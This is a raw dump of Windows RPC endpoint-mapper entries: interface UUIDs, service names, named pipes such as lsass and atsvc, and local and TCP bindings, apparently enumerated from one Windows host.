  ae33069b-a2a8-46ee-a235-ddfd339be281 v1.0 (): ncalrpc:[LRPC-cee895145d69e75581]
  ae33069b-a2a8-46ee-a235-ddfd339be281 v1.0 (): ncacn_ip_tcp:[49669]
  4a452661-8290-4b36-8fbe-7f4093a94978 v1.0 (): ncalrpc:[LRPC-cee895145d69e75581]
  4a452661-8290-4b36-8fbe-7f4093a94978 v1.0 (): ncacn_ip_tcp:[49669]
  76f03f96-cdfd-44fc-a22c-64950a001209 v1.0 (): ncalrpc:[LRPC-cee895145d69e75581]
  76f03f96-cdfd-44fc-a22c-64950a001209 v1.0 (): ncacn_ip_tcp:[49669]
  552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 (IP Transition Configuration endpoint): ncalrpc:[LRPC-817cb88bf3fd843f6a]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[LRPC-817cb88bf3fd843f6a]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoDiagnostics]
  2e6035b2-e8f1-41a7-a044-656b439c4c34 v1.0 (Proxy Manager provider server endpoint): ncalrpc:[TeredoControl]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[LRPC-817cb88bf3fd843f6a]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoDiagnostics]
  c36be077-e14b-4fe9-8abc-e856ef4f048b v1.0 (Proxy Manager client server endpoint): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[LRPC-817cb88bf3fd843f6a]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoDiagnostics]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[TeredoControl]
  c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 v1.0 (Adh APIs): ncalrpc:[OLE212C147945E8C9C7AA92472878F3]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[OLE1B50D3959DD9E9A92993C3B21095]
  abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 (): ncalrpc:[LRPC-42a3885d853a661835]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[OLE1B50D3959DD9E9A92993C3B21095]
  b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 (): ncalrpc:[LRPC-42a3885d853a661835]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[OLE1B50D3959DD9E9A92993C3B21095]
  f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 (): ncalrpc:[LRPC-42a3885d853a661835]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[OLE1B50D3959DD9E9A92993C3B21095]
  c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 (): ncalrpc:[LRPC-42a3885d853a661835]
  13560fa9-8c09-4b56-a1fd-04d083b9b2a1 v1.0 (): ncalrpc:[OLE1B50D3959DD9E9A92993C3B21095]
  13560fa9-8c09-4b56-a1fd-04d083b9b2a1 v1.0 (): ncalrpc:[LRPC-42a3885d853a661835]
  f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 (Witness Client Upcall Server): ncalrpc:[LRPC-368a2a27e6b9d61438]
  eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 (Witness Client Test Interface): ncalrpc:[LRPC-368a2a27e6b9d61438]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncalrpc:[LRPC-368a2a27e6b9d61438]
  7f1343fe-50a9-4927-a778-0c5859517bac v1.0 (DfsDs service): ncacn_np:[\\PIPE\\wkssvc]
  dd490425-5325-4565-b774-7e27d6c09c24 v1.0 (Base Firewall Engine API): ncalrpc:[LRPC-2c7644743c13400286]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-2c7644743c13400286]
  7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 (Fw APIs): ncalrpc:[LRPC-b271d746293586fd23]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-2c7644743c13400286]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-b271d746293586fd23]
  f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 (Fw APIs): ncalrpc:[LRPC-6f8baede0f148d1851]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-2c7644743c13400286]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-b271d746293586fd23]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-6f8baede0f148d1851]
  2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 (Fw APIs): ncalrpc:[LRPC-d59dcc155c747e6d0d]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[LRPC-4103f6f164839b0524]
  3473dd4d-2e88-4006-9cba-22570909dd10 v5.1 (WinHttp Auto-Proxy Service): ncalrpc:[d07f034b-652a-4fb7-9070-4166e16647ea]
  0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 (): ncalrpc:[LRPC-275f2d466c3bfa04d8]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncalrpc:[LRPC-275f2d466c3bfa04d8]
  1ff70682-0a51-30e8-076d-740be8cee98b v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncalrpc:[LRPC-275f2d466c3bfa04d8]
  378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-275f2d466c3bfa04d8]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncacn_np:[\\PIPE\\atsvc]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[ubpmtaskhostchannel]
  33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 (): ncalrpc:[LRPC-b246c62b7d9c882165]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-275f2d466c3bfa04d8]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncalrpc:[LRPC-b246c62b7d9c882165]
  86d35949-83c9-4044-b424-db363231fd0c v1.0 (): ncacn_ip_tcp:[49667]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-275f2d466c3bfa04d8]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_np:[\\PIPE\\atsvc]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[ubpmtaskhostchannel]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncalrpc:[LRPC-b246c62b7d9c882165]
  3a9ef155-691d-4449-8d05-09ad57031823 v1.0 (): ncacn_ip_tcp:[49667]
  3f787932-3452-4363-8651-6ea97bb373bb v1.0 (NSP Rpc Interface): ncalrpc:[OLE4B48B51292145E4D842AFD744DEC]
  3f787932-3452-4363-8651-6ea97bb373bb v1.0 (NSP Rpc Interface): ncalrpc:[LRPC-8aa4fb970c11795612]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[senssvc]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-f5c527dbfbd891e65e]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-bffc8480ab50a4bb2c]
  2eb08e3e-639f-4fba-97b1-14f878961076 v1.0 (Group Policy RPC Interface): ncalrpc:[LRPC-d35d667d407bac63e0]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[IUserProfile2]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncalrpc:[eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_np:[\\pipe\\eventlog]
  f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 (Event log TCPIP): ncacn_ip_tcp:[49666]
  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[DNSResolver]
  30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 (NRP server endpoint): ncalrpc:[LRPC-cf238dee32ed4f7408]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 (DHCP Client LRPC Endpoint): ncalrpc:[dhcpcsvc]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-16ad8a275507b2085e]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-16ad8a275507b2085e]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-5e78e977661ab5e5e0]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-4fef603254d3e27a11]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (): ncalrpc:[LRPC-1ce4f97b6638ffd611]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-4fef603254d3e27a11]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[OLEA26F69B04B8488BD5E18300819A2]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-72a157bbab9ed375f1]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (): ncalrpc:[LRPC-17d51d79b98950bde6]
  7ea70bcf-48af-4f6a-8968-6a440754d5fa v1.0 (NSI server endpoint): ncalrpc:[LRPC-c6a386cd3629290bed]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-eed97a066917b2d159]
  4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9 v1.0 (): ncalrpc:[umpo]
  085b0334-e454-4d91-9b8c-4134f9e793f3 v1.0 (): ncalrpc:[umpo]
  8782d3b9-ebbd-4644-a3d8-e8725381919b v1.0 (): ncalrpc:[umpo]
  3b338d89-6cfa-44b8-847e-531531bc9992 v1.0 (): ncalrpc:[umpo]
  bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760 v1.0 (): ncalrpc:[umpo]
  5824833b-3c1a-4ad2-bdfd-c31d19e23ed2 v1.0 (): ncalrpc:[umpo]
  0361ae94-0316-4c6c-8ad8-c594375800e2 v1.0 (): ncalrpc:[umpo]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[umpo]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[actkernel]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[actkernel]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[umpo]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[actkernel]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[umpo]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[actkernel]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[umpo]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[actkernel]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[umpo]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[actkernel]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[umpo]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[actkernel]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v2.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[umpo]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[actkernel]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v2.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[umpo]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[actkernel]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[umpo]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[actkernel]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[umpo]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[actkernel]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[umpo]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[actkernel]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  2c7fd9ce-e706-4b40-b412-953107ef9bb0 v0.0 (): ncalrpc:[umpo]
  c521facf-09a9-42c5-b155-72388595cbf0 v0.0 (): ncalrpc:[umpo]
  1832bcf6-cab8-41d4-85d2-c9410764f75a v1.0 (): ncalrpc:[umpo]
  4dace966-a243-4450-ae3f-9b7bcb5315b8 v2.0 (): ncalrpc:[umpo]
  178d84be-9291-4994-82c6-3f909aca5a03 v1.0 (): ncalrpc:[umpo]
  e53d94ca-7464-4839-b044-09a2fb8b3ae5 v1.0 (): ncalrpc:[umpo]
  fae436b0-b864-4a87-9eda-298547cd82f2 v1.0 (): ncalrpc:[umpo]
  082a3471-31b6-422a-b931-a54401960c62 v1.0 (): ncalrpc:[umpo]
  6982a06e-5fe2-46b1-b39c-a2c545bfa069 v1.0 (): ncalrpc:[umpo]
  0ff1f646-13bb-400a-ab50-9a78f2b7a85a v1.0 (): ncalrpc:[umpo]
  4ed8abcc-f1e2-438b-981f-bb0e8abc010c v1.0 (): ncalrpc:[umpo]
  95406f0b-b239-4318-91bb-cea3a46ff0dc v1.0 (): ncalrpc:[umpo]
  0d47017b-b33b-46ad-9e18-fe96456c5078 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-6c8062afdd11630f22]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[umpo]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[actkernel]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-6c8062afdd11630f22]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-53fb43f87612704558]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-6c8062afdd11630f22]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-53fb43f87612704558]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[umpo]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[actkernel]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-6c8062afdd11630f22]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-53fb43f87612704558]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-00d48ce111087a8494]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-6c8062afdd11630f22]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-53fb43f87612704558]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-00d48ce111087a8494]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[umpo]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[actkernel]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[OLE22BFCDCA23694F8D0001AAB2DBBF]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-fb06a68c0140adf209]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-cf4f569fc9f49d61fd]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-6c8062afdd11630f22]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-53fb43f87612704558]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-00d48ce111087a8494]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[dabrpc]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0A2D20]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WindowsShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WMsgKRpc0A2D20]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WindowsShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_ip_tcp:[49665]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_np:[\\pipe\\lsass]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[audit]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[securityevent]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSARPC_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsacap]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[LSA_EAS_ENDPOINT]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsapolicylookup]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[lsasspirpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[protected_storage]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[SidKey Local End Point]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncalrpc:[samss lpc]
  12345778-1234-abcd-ef00-0123456789ac v1.0 (): ncacn_ip_tcp:[49664]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[samss lpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49664]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_ip_tcp:[49668]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_EAS_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsapolicylookup]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsasspirpc]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[protected_storage]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[SidKey Local End Point]
